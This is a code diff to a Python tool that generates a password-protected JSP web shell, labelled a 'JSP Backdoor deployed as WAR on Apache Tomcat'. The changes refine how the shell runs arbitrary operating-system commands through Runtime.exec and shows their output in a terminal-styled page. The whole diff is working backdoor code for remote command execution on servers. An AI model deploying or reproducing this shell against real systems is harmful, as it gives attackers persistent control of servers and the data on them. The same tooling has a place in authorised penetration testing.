@@ -114,7 +114,7 @@ def preparePayload(opts):
         final String hardcodedPass = "%(password)s";
         StringBuilder res = new StringBuilder();
 
-        if (cmd != null && (pass.equals(hardcodedPass) || hardcodedPass.toLowerCase().equals("none"))){
+        if (cmd != null && cmd.length() > 0 && (pass.equals(hardcodedPass) || hardcodedPass.toLowerCase().equals("none"))){
             try {
                 Process proc = Runtime.getRuntime().exec(cmd);
                 OutputStream outs = proc.getOutputStream();
@@ -123,7 +123,7 @@ def preparePayload(opts):
                 String datainsline = datains.readLine();
 
                 while ( datainsline != null) {
-                    res.append(datainsline);
+                    res.append(datainsline + "<br/>");
                     datainsline = datains.readLine();
                 }
             } catch( IOException e) {
@@ -142,13 +142,19 @@ def preparePayload(opts):
         <title>JSP Application</title>
     </head>
     <body>
+        <h3>JSP Backdoor deployed as WAR on Apache Tomcat.</h3>
+        <i style="font-size:9px">You need to provide valid password in order to leverage RCE.</i>
+        <br/>
+        <font style="font-size:5px" style="font-style:italic;color:grey">coded by <a href="https://github.com/mgeeky">mgeeky</a></font>
+        <br/>
+        <hr/>
         <form method=post>
-        <table>
+        <table style="width:100%%">
             <tr>
-                <td>Password:</td><td><input type=password width=40 name="password" value='<%% out.print((request.getParameter("password") != null) ? request.getParameter("password") : ""); %%>' /></td>
+                <td>Password:</td><td style="width:100%%"><input type=password width=40 name="password" value='<%% out.print((request.getParameter("password") != null) ? request.getParameter("password") : ""); %%>' /></td>
             </tr>
             <tr>
-                <td>tomcat $ </td><td><input type=text width=160 name="cmd" value="uname -a" onclick='this.value=""'/></td>
+                <td>tomcat $ </td><td style="width:100%%"><input type=text size=100 name="cmd" value="uname -a" onkeydown="if (event.keyCode == 13) { this.form.submit(); return false; }" onclick='this.value=""'/></td>
             </tr>
             <tr>
                 <td><input type=submit name=submit value="Execute" /></td><td></td>
@@ -156,14 +162,14 @@ def preparePayload(opts):
         </table>
         </form>
         <hr />
-        <pre>
+        <pre style="background-color:black;color:lightgreen;padding: 5px 25px 25px 25px;height:100vh">
         <%%
             if (request.getParameter("cmd") != null && request.getParameter("password") != null) {
+                out.println("<br/>tomcat $ " + request.getParameter("cmd") + "<br/>");
                 out.println(execute(request.getParameter("password"), request.getParameter("cmd")));
             }
         %%>
         </pre>
-        <br />
     </body>
 </html>''' % {'title': opts.title, 'password': opts.shellpass }
 
@@ -176,10 +182,6 @@ def invokeApplication(browser, url, appname):
     try:
         resp = browser.open(appurl)
         logging.info('Application returned:')
-        print '-' * 40
-        print resp.read()
-        print '-' * 40
-
         return True
 
     except urllib2.HTTPError, e:
